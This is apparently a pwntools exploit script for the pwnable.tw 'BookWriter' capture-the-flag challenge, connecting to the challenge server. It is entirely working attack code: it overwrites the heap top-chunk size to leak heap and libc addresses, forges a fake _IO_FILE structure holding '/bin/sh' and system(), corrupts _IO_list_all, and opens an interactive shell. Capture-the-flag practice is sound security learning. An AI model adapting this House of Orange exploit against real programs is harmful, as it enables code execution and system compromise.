from pwn import *


sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)


def author(name):
    sa(b'Author :', name)
def add_page(size, data):
    sla(b'choice :', b'1')
    sla(b'page :', str(size).encode())
    sa(b'Content :', data)
def view_page(index):
    sla(b'choice :', b'2')
    sla(b'Index of page :', str(index).encode())
def edit_page(index, data):
    sla(b'choice :', b'3')
    sla(b'Index of page :', str(index).encode())
    sa(b'Content:', data)
def info(author = None):
    sla(b'choice :', b'4')
    if author != None:
        sla(b'(yes:1 / no:0)', b'1')
        sa(b'Author :', author)
    else:
        sla(b'(yes:1 / no:0)', b'0`')
    

elf = context.binary = ELF('bookwriter')
libc = ELF('libc.so.6')



#nc chall.pwnable.tw 10304
p = remote('chall.pwnable.tw', 10304)
#p = process()
#gdb.attach(p, gdbscript='''
#b abort
#c
#''')

author(b'A'*64)
add_page(0x68, b'Meo') # make sure (top chunk + top chunk's size) & 0xfff == 0 (alignment)
for i in range(6):
    add_page(0x18, b'A')
edit_page(6, b'A'*0x18)
edit_page(6, b'A'*0x18 + p64(0xed1))

#view_page(0)
sla(b'choice :', b'4')
p.recvuntil(b'A'*64)
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap = leak - 0x10
print('heap: ', hex(heap))
sla(b'(yes:1 / no:0)', b'0`')



add_page(0x10, b'A'*8)
view_page(7)
p.recvuntil(b'A'*8)
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - 0x3c4188
print('libc: ', hex(libc.address))


edit_page(0, b'\x00')
add_page(0x10, b'A')
chunk = p64(0) + p64(0x21) + p64(0)*2
payload = p64(0)*3 + p64(libc.symbols['system']) + p64(0)*8 + chunk*8
file = b'/bin/sh\x00'
file += p64(0x61)
file += p64(0)
file += p64(libc.symbols['_IO_list_all'] - 0x10)
file += p64(1)
file += p64(2)
file = file.ljust(0xa0, b'\x00')
file += p64(heap)
file += p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2
file += p64(heap + 0x10)
payload += file
edit_page(0, payload)



sla(b'choice :', b'1')
sla(b'page :', str(1).encode())

p.interactive()